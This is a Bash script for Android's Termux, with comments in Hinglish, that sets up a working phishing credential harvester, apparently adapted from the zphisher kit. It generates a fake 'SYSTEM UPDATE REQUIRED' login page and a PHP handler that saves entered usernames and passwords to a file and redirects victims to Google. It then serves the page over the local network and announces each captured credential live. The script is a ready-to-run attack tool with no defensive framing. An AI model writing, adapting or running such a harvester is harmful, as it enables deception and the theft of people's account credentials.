#!/bin/bash

# --- 1. SETUP CLEAN ENVIRONMENT (Home Folder) ---
# Hum current folder ki jagah HOME me ek naya folder banayenge
# Taki permission ka koi jhanjhat hi na rahe.
HOME_DIR="/data/data/com.termux/files/home"
WORK_DIR="$HOME_DIR/.zphisher_pro_env"
TMP_DIR="$WORK_DIR/tmp"

# Clean old run
pkill -f php > /dev/null 2>&1
rm -rf "$WORK_DIR"

# Create Directories
mkdir -p "$WORK_DIR/auth"
mkdir -p "$TMP_DIR"
chmod -R 777 "$WORK_DIR"

# --- 2. CREATE DUMMY SITE (Login Page) ---
cat > "$WORK_DIR/auth/index.php" <<EOF
<!DOCTYPE html>
<html>
<head>
<style>
body{background:#000;color:#0f0;font-family:monospace;text-align:center;margin-top:50px;}
input{border:1px solid #0f0;background:#000;color:#fff;padding:10px;margin:5px;width:80%;}
button{background:#0f0;color:#000;border:none;padding:10px 20px;font-weight:bold;}
</style>
</head>
<body>
<h1>SYSTEM UPDATE REQUIRED</h1>
<p>Please login to continue...</p>
<form method="POST" action="login.php">
<input type="text" name="username" placeholder="Username" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">LOGIN</button>
</form>
</body>
</html>
EOF

# --- 3. CREATE LOGIN CAPTURE ---
cat > "$WORK_DIR/auth/login.php" <<EOF
<?php
file_put_contents("../usernames.txt", "User: " . \$_POST['username'] . " Pass: " . \$_POST['password'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
?>
EOF

# --- 4. LAUNCHER INTERFACE ---
GREEN='\033[1;32m'
CYAN='\033[1;36m'
RED='\033[1;31m'
RESET='\033[0m'

clear
echo -e "${GREEN}=========================================${RESET}"
echo -e "${CYAN}      FINAL FIX LAUNCHER (Home Dir)      ${RESET}"
echo -e "${GREEN}=========================================${RESET}"

echo -e "${CYAN}[*] Starting Server from Safe Location...${RESET}"

# --- 5. RUN SERVER (The Fix) ---
# Hum server ko 'auth' folder me chalayenge, lekin TMP path force karenge
cd "$WORK_DIR"
php -S 0.0.0.0:8080 -t auth \
    -d upload_tmp_dir="$TMP_DIR" \
    -d session.save_path="$TMP_DIR" \
    -d sys_temp_dir="$TMP_DIR" \
    > "$WORK_DIR/php_error.log" 2>&1 &
PID=$!
sleep 2

# Check Status
if ps -p $PID > /dev/null; then
    echo -e "${GREEN}[✔] SERVER STARTED!${RESET}"
    echo -e "${CYAN}[-] Local: http://127.0.0.1:8080${RESET}"
    
    # Get IP
    MYIP=$(ifconfig 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | grep -v "127.0.0.1" | head -n 1)
    if [ ! -z "$MYIP" ]; then
        echo -e "${CYAN}[-] WiFi:  http://$MYIP:8080${RESET}"
    fi
    
    echo -e "${RED}[-] Press Ctrl + C to Exit${RESET}"
    echo ""
    echo -e "${GREEN}Waiting for Passwords...${RESET}"
    
    # Log Loop
    touch usernames.txt
    tail -f usernames.txt "$WORK_DIR/php_error.log" --pid=$PID 2>/dev/null | while read line; do
        if [[ "$line" == *"User:"* ]]; then
             echo -e "${RED}[!] CAPTURED: $line${RESET}"
             echo -e "\a"
        fi
    done
else
    echo -e "${RED}[!] ERROR: Server Failed.${RESET}"
    cat "$WORK_DIR/php_error.log"
fi
